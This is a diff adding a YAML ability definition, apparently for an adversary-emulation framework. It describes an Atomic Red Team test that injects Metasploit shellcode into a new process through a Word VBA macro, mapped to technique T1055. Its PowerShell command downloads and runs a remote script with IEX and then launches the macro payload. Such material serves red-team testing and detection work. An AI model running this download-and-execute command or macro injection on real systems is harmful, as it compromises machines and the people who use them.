@@ -1,0 +1,32 @@
+---
+- id: 9999b5c073203122cbe5f1f5438cf637
+  name: Shellcode execution via VBA
+  description: 'This module injects shellcode into a newly created process and executes.
+    By default the shellcode is created,
+
+    with Metasploit, for use on x86-64 Windows 10 machines.
+
+
+    Note: Due to the way the VBA code handles memory/pointers/injection, a 64bit installation
+    of Microsoft Office
+
+    is required.
+
+    '
+  tactic: multiple
+  technique:
+    attack_id: T1055
+    name: Process Injection
+  platforms:
+    windows:
+      psh:
+        command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"
+          -UseBasicParsing); Invoke-Maldoc -macroFile "40c65d_T1055-macrocode.txt"
+          -officeProduct "Word" -sub "Execute"'
+        payloads:
+        - 40c65d_T1055-macrocode.txt
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
